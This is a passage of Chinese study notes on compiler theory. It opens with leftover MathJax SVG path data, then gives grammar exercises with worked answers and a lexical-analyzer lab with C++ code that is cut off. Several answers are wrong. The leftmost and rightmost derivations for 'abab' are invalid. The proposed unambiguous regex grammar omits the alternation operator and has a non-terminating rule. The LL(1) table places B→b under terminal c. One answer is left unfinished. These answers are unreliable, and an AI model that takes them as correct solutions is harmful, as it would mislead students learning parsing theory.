17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="msup" transform="translate(1036.3,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g><g data-mml-node="mi" transform="translate(462,413) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="msup" transform="translate(2169.1,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g><g data-mml-node="mi" transform="translate(466,413) scale(0.707)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g></g><g data-mml-node="mo" transform="translate(3040.8,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mi" transform="translate(3318.8,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(4196.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mi" transform="translate(5252.3,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(6130.3,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">或</text></g><g data-mml-node="mi" transform="translate(7130.3,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(8286.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mi" transform="translate(9341.9,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g></g></g></g></svg></mjx-container></p>
<blockquote>
<p>G={N,T,P,S}</p>
<p>N={S,S1,S2,A,B,C,D}</p>
<p>T={a,b,c}</p>
<p>P={S-&gt;S<del>1</del>|S<del>2</del>，S<del>1</del>-&gt;AB, A-&gt;aAb|ϵ,B-&gt;cB|ϵ, S<del>2</del>-&gt;CD, C-&gt;bBc|ϵ, D-&gt;aD|ϵ}</p>
</blockquote>
</li>
<li><p>任何不是以0开始的所有奇整数的集合</p>
<ul>
<li><p><strong>奇整数：</strong><br>奇整数的最后一位数字必须是奇数，即 {1,3,5,7,9}{1, 3, 5, 7, 9}{1,3,5,7,9}。</p>
<p><strong>非以 0 开头：</strong><br>非以 0 开头意味着数字串的第一个字符不能是 000。</p>
<p><strong>有效形式：</strong></p>
<ul>
<li>单位数奇数：{1,3,5,7,9}。</li>
<li>多位奇数：{d1d2…dk∣d1≠0,dk∈{1,3,5,7,9},d2,…,dk−1∈{0,1,…,9}}。</li>
</ul>
</li>
<li><p><strong>非终结符</strong></p>
<ul>
<li>S: 起始符号，表示整个数字串。</li>
<li>D: 表示第一个非零数字（开头数字）。</li>
<li>U: 表示单位数奇数（单个位数的奇整数）</li>
<li>M: 表示中间可以是任意数字的部分（包含 0 到 9）。</li>
<li>O: 表示奇数结尾。</li>
</ul>
</li>
<li><p>文法规则</p>
<p>S→DO∣DMO</p>
<p>U→O</p>
<p>D→1∣2∣3∣4∣5∣6∣7∣8∣9</p>
<p>M→0M∣1M∣2M∣3M∣4M∣5M∣6M∣7M∣8M∣9M∣ϵ</p>
<p>O→1∣3∣5∣7∣9</p>
</li>
</ul>
<blockquote>
<p>G={N,T,P,S}</p>
<p>N={S,C,M,U,O}</p>
<p>P={S→U∣DMO</p>
<p>U-&gt;O</p>
<p>D→1∣2∣3∣4∣5∣6∣7∣8∣9</p>
<p>M→0M∣1M∣2M∣3M∣4M∣5M∣6M∣7M∣8M∣9M∣ϵ</p>
<p>O→1∣3∣5∣7∣9}</p>
</blockquote>
</li>
</ul>
<p><strong>例题2:</strong> 考虑文法<br>           <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="19.725ex" height="2.26ex" role="img" focusable="false" viewbox="0 -749.5 8718.6 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mo" transform="translate(922.8,0)"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"/></g><g data-mml-node="mi" transform="translate(2200.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mi" transform="translate(2729.6,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mi" transform="translate(3374.6,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g><g data-mml-node="mi" transform="translate(3803.6,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mtext" transform="translate(4448.6,0)"><path data-c="A0" d=""/></g><g data-mml-node="mo" transform="translate(4698.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mtext" transform="translate(4976.6,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(5226.6,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g><g data-mml-node="mi" transform="translate(5655.6,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mi" transform="translate(6300.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mi" transform="translate(6829.6,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mtext" transform="translate(7474.6,0)"><path data-c="A0" d=""/></g><g data-mml-node="mo" transform="translate(7724.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mtext" transform="translate(8002.6,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(8252.6,0)"><path data-c="1D700" d="M190 -22Q124 -22 76 11T27 107Q27 174 97 232L107 239L99 248Q76 273 76 304Q76 364 144 408T290 452H302Q360 452 405 421Q428 405 428 392Q428 381 417 369T391 356Q382 356 371 365T338 383T283 392Q217 392 167 368T116 308Q116 289 133 272Q142 263 145 262T157 264Q188 278 238 278H243Q308 278 308 247Q308 206 223 206Q177 206 142 219L132 212Q68 169 68 112Q68 39 201 39Q253 39 286 49T328 72T345 94T362 105Q376 103 376 88Q376 79 365 62T334 26T275 -8T190 -22Z"/></g></g></g></svg></mjx-container><br>（a） 为句子 abab 构造两个不同的最左推导，以此说明该文法是二义的。<br>（b） 为 abab 构造对应的最右推导。<br>（c） 为 abab 构造对应的分析树。<br>（d） 这个文法产生的语言是什么？ </p>
<blockquote>
<p>(a) S-&gt;aSbS						 S-&gt;aSbS<br>-&gt;abS					       -&gt;abSaSbS<br>-&gt;abaSbS					    -&gt;abaSbS<br>-&gt;ababS						 -&gt;ababS<br>-&gt;abab						  -&gt;abab   </p>
<p>可知改文法是二义的</p>
<p>(b)S-&gt;aSbS						 S-&gt;aSbS<br>-&gt;aSb						   -&gt;aSbaSbS<br>-&gt;abSaSb 	 				  -&gt;aSbaSb<br>-&gt;abSab 					    -&gt;aSbab<br>-&gt;abab 						 -&gt;abab</p>
<p>(c)</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%BA%8C%E4%B9%89%E5%88%86%E6%9E%90%E6%A0%91.png" alt="二义分析树"></p>
<p>(d)产生a,b数量相等的ab串。</p>
</blockquote>
<p><strong>例题3：</strong>文法<br>$$R\to R’|’R\ \ |\ \ RR\ \ |\ \ R<em>\ |\ (R)\ |\ a\ |\ b$$<br>产生字母表{a,b}上所有不含 ε的正规式。注意，第一条竖线是正规式的符号“或”，而<br>不是文法产生式右部各选择之间的分隔符，另外“*”在这儿是一个普通的终结符。该文<br>法是二义的。<br>(a) 为该文法写一个等价的非二义的文法。运算优先级：星闭包 (∗) &gt; 连接 (RR) &gt; 或 (∣)。<br>(b) 按上面两个文法构造句子 ab|b</em>a 的分析树。</p>
<blockquote>
<p>(a)</p>
<p>S-&gt;E<br>E-&gt;T|E’<br>E’-&gt;E’T<br>T-&gt;FT’<br>T’-&gt;T|ɛ<br>F-&gt;(E)|F*|a|b</p>
<p>(b)</p>
<p>学不动了，后面再学吧，救救孩子吧</p>
<h4 id><a href="#" class="headerlink" title></a></h4></blockquote>
<p><strong>例题4：</strong>选择题</p>
<ul>
<li>下列关于LL(1)分析表的说法中正确的是(A)<ul>
<li>A.LL(1)分析表指示栈顶为非终结符时面临输入符号应该选择的产生式。</li>
<li>B.LL(1)文法的LL(1)分析表可以有多重定义。</li>
<li>C.一个产生式只能在LL(1)分析表中填写一次。</li>
<li>D.LL(1)分析表也可用于自底向上语法分析。</li>
</ul>
</li>
</ul>
<p><strong>例题5：</strong></p>
<p>求下面文法每个非终结符号的FIRST集和FOLLOW集，并构造下面文法的LL(1)分析表。</p>
<ul>
<li>S:=aAd</li>
<li>A:=BC</li>
<li>B:=b|ɛ</li>
<li>C:=c|ɛ</li>
</ul>
<blockquote>
<p>FIRST(S)={a}							   |FOLLOW(S)={$}</p>
<p>FIRRST(A)={b,c,ɛ}						  |FOLLOW(A)={d}</p>
<p>FIRRST(B)={b,ɛ}							|FOLLOW(B)={c,d}</p>
<p>FIRRST(C)={c,ɛ}                            |FOLLOW(C)={d}</p>
<p>LL(1)分析表</p>
<table>
<thead>
<tr>
<th></th>
<th>a</th>
<th>b</th>
<th>c</th>
<th>d</th>
<th>$</th>
</tr>
</thead>
<tbody><tr>
<td>S</td>
<td>1</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>A</td>
<td></td>
<td>2</td>
<td>2</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>B</td>
<td></td>
<td>3</td>
<td>3</td>
<td>4</td>
<td></td>
</tr>
<tr>
<td>C</td>
<td></td>
<td></td>
<td>5</td>
<td>6</td>
<td></td>
</tr>
</tbody></table>
</blockquote>
<h2 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h2><p><strong>语义分析</strong>：检查抽象语法树的合法性</p>
<p>语义分析：类型检查、变量声明检查、参数类型检查、参数数量检查、函数是否声明、函数是否定义</p>
<h2 id="语法制导翻译"><a href="#语法制导翻译" class="headerlink" title="语法制导翻译"></a>语法制导翻译</h2><h2 id="精简词法分析实现实验"><a href="#精简词法分析实现实验" class="headerlink" title="精简词法分析实现实验"></a>精简词法分析实现实验</h2><p>一、实验目的</p>
<p>1、 深入理解有限自动机及其应用</p>
<p>2、 编辑一个词法分析器，了解计算机识别源程序字符串的过程。</p>
<p>二、实验内容和要求</p>
<p>实验内容：处理c语言源程序，对源程序进行编译预处理（去除注释、无用的回车换行找到包含的文件等）之后，对整个源程序进行分解，分解成一个个单词，这些单词有且只有五类，分别是标识符、保留字、常数、运算符、界符。</p>
<p>实验要求：编写一个简单的词法分析程序，</p>
<p>输入：源程序，</p>
<p>输出：二元组&lt;单词本身,种别码&gt;。</p>
<p><strong>程序流程：</strong></p>
<p>1、 打开源程序，读取文件内容，直至遇到“$”文件结束符，读取结束。</p>
<p>2、 对读取的文件进行<strong>预处理，</strong>从头到尾进行扫描，<strong>去除//和/*</strong> ***/<strong><strong>的内容，以及一些无用的</strong></strong>、影响程序执行的符号如换行符、回车符、制表符等**。（但是千万注意不要在这个时候去除空格）。</p>
<p>3、 对源文件从头到尾进行扫描，扫描前判断当前字符是不是空格，如果是，扫描下一个字符，直至不是空格，然后判断是不是字母，若是则进行标识符和保留字的识别；若这个字符为数字，则进行数字的判断。否则，依次对这个字符可能的情况进行判断，<strong>若是将所有可能都走了一遍还是没有知道它是谁，则****认定为错误符号</strong>，输出该错误符号，然后结束。每次成功识别了一个单词后，单词都会存在token[ ]中。<strong>然后确定这个单词的种别码，最后进行下一个单词的识别。（</strong>简单起见，数字只是整数。）</p>
<p>4、 <strong>主控程序</strong>主要负责对每次识别的种别码syn进行判断，对于不同的单词种别做出不同的反应，如对于标识符则将其插入标识符表中。对于保留字则输出该保留字的种别码和助记符，等等。**直至遇到syn=0;**程序结束。</p>
<p><strong>备注：</strong>需要将识别的源代码放入.\source.txt文件中。</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保留字表</span></span><br><span class="line"><span class="type">const</span> unordered_map&lt;string, <span class="type">int</span>&gt; reserveWords = {</span><br><span class="line">    {<span class="string">"main"</span>,<span class="number">0</span>}, {<span class="string">"auto"</span>, <span class="number">1</span>}, {<span class="string">"break"</span>, <span class="number">2</span>}, {<span class="string">"case"</span>, <span class="number">3</span>}, {<span class="string">"char"</span>, <span class="number">4</span>}, {<span class="string">"const"</span>, <span class="number">5</span>}, {<span class="string">"continue"</span>, <span class="number">6</span>},</span><br><span class="line">    {<span class="string">"default"</span>,<span class="number">7</span>},{<span class="string">"do"</span>,<span class="number">8</span>},{<span class="string">"double"</span>,<span class="number">9</span>},{<span class="string">"else"</span>,<span class="number">10</span>}, {<span class="string">"enum"</span>,<span class="number">11</span>},{<span class="string">"extern"</span>,<span class="number">12</span>},{<span class="string">"float"</span>,<span class="number">13</span>},{<span class="string">"for"</span>,<span class="number">14</span>},</span><br><span class="line">    {<span class="string">"goto"</span>,<span class="number">15</span>},{<span class="string">"if"</span>,<span class="number">16</span>},{<span class="string">"int"</span>,<span class="number">17</span>},{<span class="string">"long"</span>,<span class="number">18</span>},{<span class="string">"register"</span>,<span class="number">19</span>},{<span class="string">"return"</span>,<span class="number">20</span>},{<span class="string">"short"</span>,<span class="number">21</span>},</span><br><span class="line">    {<span class="string">"signed"</span>,<span class="number">22</span>},{<span class="string">"sizeof"</span>,<span class="number">23</span>},{<span class="string">"static"</span>,<span class="number">24</span>},{<span class="string">"struct"</span>,<span class="number">25</span>},{<span class="string">"switch"</span>,<span class="number">26</span>},{<span class="string">"typedef"</span>,<span class="number">27</span>},</span><br><span class="line">    {<span class="string">"union"</span>,<span class="number">28</span>},{<span class="string">"unsigned"</span>,<span class="number">29</span>},{<span class="string">"void"</span>,<span class="number">30</span>},{<span class="string">"volatile"</span>, <span class="number">31</span>}, {<span class="string">"while"</span>, <span class="number">32</span>}</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运算符和界符表</span></span><br><span class="line"><span class="type">const</span> unordered_map&lt;string, <span class="type">int</span>&gt; operatorsAndDelimiters = {</span><br><span class="line">    {<span class="string">"("</span>, <span class="number">17</span>}, {<span class="string">")"</span>, <span class="number">18</span>}, {<span class="string">"{"</span>, <span class="number">19</span>}, {<span class="string">"}"</span>, <span class="number">20</span>}, {<span class="string">"["</span>, <span class="number">21</span>}, {<span class="string">"]"</span>, <span class="number">22</span>},</span><br><span class="line">    {<span class="string">"&lt;"</span>, <span class="number">23</span>}, {<span class="string">"&lt;="</span>, <span class="number">24</span>}, {<span class="string">"&gt;"</span>, <span class="number">25</span>}, {<span class="string">"&gt;="</span>, <span class="number">26</span>}, {<span class="string">"="</span>, <span class="number">27</span>}, {<span class="string">"=="</span>, <span class="number">28</span>},</span><br><span class="line">    {<span class="string">"+"</span>, <span class="number">29</span>}, {<span class="string">"-"</span>, <span class="number">30</span>}, {<span class="string">"*"</span>, <span class="number">31</span>}, {<span class="string">"/"</span>, <span class="number">32</span>}, {<span class="string">"^"</span>, <span class="number">33</span>}, {<span class="string">";"</span>, <span class="number">34</span>}</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 标识符表</span></span><br><span class="line">vector&lt;string&gt; identifiers;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 辅助函数</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isLetter</span><span class="params">(<span class="type">char</span> ch)</span> </span>{ <span class="keyword">return</span> <span class="built_in">isalpha</span>(ch) || ch == <span 